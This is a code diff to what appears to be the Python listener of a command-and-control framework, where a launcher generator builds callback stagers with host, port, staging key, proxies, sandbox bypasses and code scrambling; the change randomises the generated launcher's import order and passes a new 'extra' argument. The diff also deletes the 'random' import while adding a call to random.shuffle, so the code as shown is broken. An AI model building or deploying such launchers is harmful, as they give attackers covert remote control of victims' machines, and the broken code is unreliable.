@@ -1,8 +1,5 @@
-import base64
 import copy
 import logging
-import os
-import random
 import ssl
 import sys
 import time
@@ -26,12 +23,13 @@ log = logging.getLogger(__name__)
 
 class LauncherGen(object):
     def __init__(self, host: str, port: int, path: str,
-                 ua: str, cookie: str, key: str, headers: [], proxies: [], funcs: [str]):
+                 ua: str, cookie: str, key: str, headers: [], proxies: [], funcs: [str], extra: {}):
+        log.error(extra)
         self.funcs = funcs
         # sourcery skip: low-code-quality
-        self.imports = '''import os, sys, re, subprocess, urllib.request
-'''
-
+        self.imports_list = ['os', 'sys', 're', 'subprocess', 'urllib.request', 'hmac']
+        random.shuffle(self.imports_list)
+        self.imports = 'import ' + ', '.join(self.imports_list)
         self.static = '''
 class Dnull:
     def write(self, msg):
@@ -307,11 +305,14 @@ class Listener(object):
             safeChecks="",
             listenerName=None,
             bypasses: List[str] = None,
-            build_arch='win'
+            build_arch='win',
+            extra=None
     ):
         """
         Generate a launcher for the specified listener.
         """
+        if extra is None:
+            extra = {}
         bypasses = [] if bypasses is None else bypasses
         if not language:
             log.error(
@@ -365,7 +366,7 @@ class Listener(object):
                     additional_func.append(python_proc_checks(build_arch, procs[1].split(',')))
 
             gen = LauncherGen(host, port, stage0, userAgent, b64_routing_packet,
-                              staging_key, custom_headers, proxies, additional_func).gen()
+                              staging_key, custom_headers, proxies, additional_func, extra).gen()
 
             if obfuscate:
                 log.info("Scrambling code")
